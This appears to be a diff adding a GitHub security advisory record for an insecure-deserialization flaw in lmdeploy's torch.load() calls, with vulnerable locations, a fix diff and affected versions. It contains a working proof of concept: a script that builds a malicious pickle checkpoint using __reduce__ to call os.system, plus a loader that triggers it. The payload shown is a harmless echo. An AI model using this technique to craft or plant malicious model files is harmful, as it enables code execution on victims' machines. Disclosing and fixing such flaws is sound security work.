@@ -1,0 +1,99 @@
+{
+  "id": "GHSA-9pf3-7rrr-x5jh",
+  "modified": "2025-12-26T17:56:13.755121Z",
+  "published": "2025-12-26T17:34:08Z",
+  "aliases": [
+    "CVE-2025-67729"
+  ],
+  "summary": "lmdeploy vulnerable to Arbitrary Code Execution via Insecure Deserialization in torch.load()",
+  "details": "## Summary\n\nAn insecure deserialization vulnerability exists in lmdeploy where `torch.load()` is called without the `weights_only=True` parameter when loading model checkpoint files. This allows an attacker to execute arbitrary code on the victim's machine when they load a malicious `.bin` or `.pt` model file.\n\n\n**CWE:** CWE-502 - Deserialization of Untrusted Data\n\n---\n\n## Details\n\nSeveral locations in lmdeploy use `torch.load()` without the recommended `weights_only=True` security parameter. PyTorch's `torch.load()` uses Python's pickle module internally, which can execute arbitrary code during deserialization.\n\n### Vulnerable Locations\n\n**1. `lmdeploy/vl/model/utils.py` (Line 22)**\n\n```python\ndef load_weight_ckpt(ckpt: str) -\u003e Dict[str, torch.Tensor]:\n    \"\"\"Load checkpoint.\"\"\"\n    if ckpt.endswith('.safetensors'):\n        return load_file(ckpt)  # Safe - uses safetensors\n    else:\n        return torch.load(ckpt)  # ← VULNERABLE: no weights_only=True\n```\n\n**2. `lmdeploy/turbomind/deploy/loader.py` (Line 122)**\n\n```python\nclass PytorchLoader(BaseLoader):\n    def items(self):\n        params = defaultdict(dict)\n        for shard in self.shards:\n            misc = {}\n            tmp = torch.load(shard, map_location='cpu')  # ← VULNERABLE\n```\n\n**Additional vulnerable locations:**\n- `lmdeploy/lite/apis/kv_qparams.py:129-130`\n- `lmdeploy/lite/apis/smooth_quant.py:61`\n- `lmdeploy/lite/apis/auto_awq.py:101`\n- `lmdeploy/lite/apis/get_small_sharded_hf.py:41`\n\n### Note: Secure Pattern Already Exists\n\nThe codebase already uses the secure pattern in one location:\n\n```python\n# lmdeploy/pytorch/weight_loader/model_weight_loader.py:103\nstate = torch.load(file, weights_only=True, map_location='cpu')  # ✓ Secure\n```\n\nThis shows the fix is already known and can be applied consistently across the codebase.\n\n---\n\n## PoC\n\n### Step 1: Create a Malicious Checkpoint File\n\nSave this as `create_malicious_checkpoint.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nCreates a malicious PyTorch checkpoint that executes code when loaded.\n\"\"\"\nimport pickle\nimport os\n\nclass MaliciousPayload:\n    \"\"\"Executes arbitrary code during pickle deserialization.\"\"\"\n    \n    def __init__(self, command):\n        self.command = command\n    \n    def __reduce__(self):\n        # This is called during unpickling - returns (callable, args)\n        return (os.system, (self.command,))\n\ndef create_malicious_checkpoint(output_path, command):\n    \"\"\"Create a malicious checkpoint file.\"\"\"\n    malicious_state_dict = {\n        'model.layer.weight': MaliciousPayload(command),\n        'config': {'hidden_size': 768}\n    }\n    \n    with open(output_path, 'wb') as f:\n        pickle.dump(malicious_state_dict, f)\n    \n    print(f\"[+] Created malicious checkpoint: {output_path}\")\n\nif __name__ == \"__main__\":\n    os.makedirs(\"malicious_model\", exist_ok=True)\n    create_malicious_checkpoint(\n        \"malicious_model/pytorch_model.bin\",\n        \"echo '[PoC] Arbitrary code executed! - RCE confirmed'\"\n    )\n```\n\n### Step 2: Load the Malicious File (Simulates lmdeploy's Behavior)\n\nSave this as `exploit.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nDemonstrates the vulnerability by loading the malicious checkpoint.\nThis simulates what happens when lmdeploy loads an untrusted model.\n\"\"\"\nimport pickle\n\ndef unsafe_load(path):\n    \"\"\"Simulates torch.load() without weights_only=True.\"\"\"\n    # torch.load() uses pickle internally, so this is equivalent\n    with open(path, 'rb') as f:\n        return pickle.load(f)\n\nif __name__ == \"__main__\":\n    print(\"[*] Loading malicious checkpoint...\")\n    print(\"[*] This simulates: torch.load(ckpt) in lmdeploy\")\n    print(\"-\" * 50)\n    \n    result = unsafe_load(\"malicious_model/pytorch_model.bin\")\n    \n    print(\"-\" * 50)\n    print(f\"[!] Checkpoint loaded. Keys: {list(result.keys())}\")\n    print(\"[!] If you see the PoC message above, RCE is confirmed!\")\n```\n\n### Step 3: Run the PoC\n\n```bash\n# Create the malicious checkpoint\npython create_malicious_checkpoint.py\n\n# Exploit - triggers code execution\npython exploit.py\n```\n\n### Expected Output\n\n```\n[+] Created malicious checkpoint: malicious_model/pytorch_model.bin\n[*] Loading malicious checkpoint...\n[*] This simulates: torch.load(ckpt) in lmdeploy\n--------------------------------------------------\n[PoC] Arbitrary code executed! - RCE confirmed     ← Code executed here!\n--------------------------------------------------\n[!] Checkpoint loaded. Keys: ['model.layer.weight', 'config']\n[!] If you see the PoC message above, RCE is confirmed!\n```\n\nThe `[PoC] Arbitrary code executed!` message proves that arbitrary shell commands run during deserialization.\n\n---\n\n## Impact\n\n### Who Is Affected?\n\n- **All users** who load PyTorch model files (`.bin`, `.pt`) from untrusted sources\n- This includes models downloaded from HuggingFace, ModelScope, or shared by third parties\n\n### Attack Scenario\n\n1. Attacker creates a malicious model file (e.g., `pytorch_model.bin`) containing a pickle payload\n2. Attacker distributes it as a \"fine-tuned model\" on model sharing platforms or directly to victims\n3. Victim downloads and loads the model using lmdeploy\n4. Malicious code executes with the victim's privileges\n\n### Potential Consequences\n\n- **Remote Code Execution (RCE)** - Full system compromise\n- **Data theft** - Access to sensitive files, credentials, API keys\n- **Lateral movement** - Pivot to other systems in cloud environments\n- **Cryptomining or ransomware** - Malware deployment\n\n---\n\n## Recommended Fix\n\nAdd `weights_only=True` to all `torch.load()` calls:\n\n```diff\n# lmdeploy/vl/model/utils.py:22\n- return torch.load(ckpt)\n+ return torch.load(ckpt, weights_only=True)\n\n# lmdeploy/turbomind/deploy/loader.py:122\n- tmp = torch.load(shard, map_location='cpu')\n+ tmp = torch.load(shard, map_location='cpu', weights_only=True)\n\n# Apply the same pattern to:\n# - lmdeploy/lite/apis/kv_qparams.py:129-130\n# - lmdeploy/lite/apis/smooth_quant.py:61\n# - lmdeploy/lite/apis/auto_awq.py:101\n# - lmdeploy/lite/apis/get_small_sharded_hf.py:41\n```\n\nAlternatively, consider migrating fully to SafeTensors format, which is already supported in the codebase and immune to this vulnerability class.\n\n---\n\n## Resources\n\n### Official PyTorch Security Documentation\n\n- **[PyTorch torch.load() Documentation](https://pytorch.org/docs/stable/generated/torch.load.html)**\n  \n  \u003e *\"torch.load() uses pickle module implicitly, which is known to be insecure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never load data that could have come from an untrusted source.\"*\n\n### Related CVEs\n\n| CVE | Description | CVSS |\n|-----|-------------|------|\n| [CVE-2025-32434](https://nvd.nist.gov/vuln/detail/CVE-2025-32434) | PyTorch `torch.load()` RCE vulnerability | **9.3 Critical** |\n| [CVE-2024-5452](https://nvd.nist.gov/vuln/detail/CVE-2024-5452) | PyTorch Lightning insecure deserialization | **8.8 High** |\n\n### Additional Resources\n\n- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)\n- [Trail of Bits: Exploiting ML Pickle Files](https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/)\n- [Rapid7: Attackers Weaponizing AI Models](https://www.rapid7.com/blog/post/2024/02/06/attackers-are-weaponizing-ai-model-files/)\n\n---\n\nThank you for your time reviewing this report. I'm happy to provide any additional information or help with testing the fix. Please let me know if you have any questions!",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "lmdeploy",
+        "purl": "pkg:pypi/lmdeploy"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.11.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.13",
+        "0.0.14",
+        "0.1.0",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.11.0",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.2.6",
+        "0.3.0",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.2.post1",
+        "0.5.3",
+        "0.6.0",
+        "0.6.0a0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.2.post1",
+        "0.6.3",
+        "0.6.4",
+        "0.6.5",
+        "0.7.0",
+        "0.7.0.post1",
+        "0.7.0.post2",
+        "0.7.0.post3",
+        "0.7.1",
+        "0.7.2",
+        "0.7.2.post1",
+        "0.7.3",
+        "0.8.0",
+        "0.9.0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.2.post1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.11",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-9pf3-7rrr-x5jh/GHSA-9pf3-7rrr-x5jh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/InternLM/lmdeploy/security/advisories/GHSA-9pf3-7rrr-x5jh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/InternLM/lmdeploy/commit/eb04b4281c5784a5cff5ea639c8f96b33b3ae5ee"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/InternLM/lmdeploy"
+    }
+  ]
+}
